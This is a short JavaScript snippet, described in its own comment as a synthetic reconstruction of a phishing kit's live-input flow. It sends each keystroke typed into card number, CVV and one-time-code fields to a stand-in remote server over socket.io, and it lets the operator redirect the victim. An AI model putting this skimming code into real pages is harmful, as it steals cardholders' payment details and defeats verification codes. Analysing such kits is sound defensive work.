// Representative of the published live-input and operator-controlled flow;
// event names and reserved endpoint are synthetic, not recovered kit code.
const socket = io('https://checkout-panel.example.invalid');
const card = document.querySelector('input[autocomplete="cc-number"]');
const cvv = document.querySelector('input[autocomplete="cc-csc"]');
const otp = document.querySelector('input[autocomplete="one-time-code"]');
card.addEventListener('input', e => socket.emit('field', {value: e.target.value}));
cvv.addEventListener('input', e => socket.emit('field', {value: e.target.value}));
otp.addEventListener('input', e => socket.emit('verification', {value: e.target.value}));
socket.on('verification-page', page => { window.location.href = page.url; });
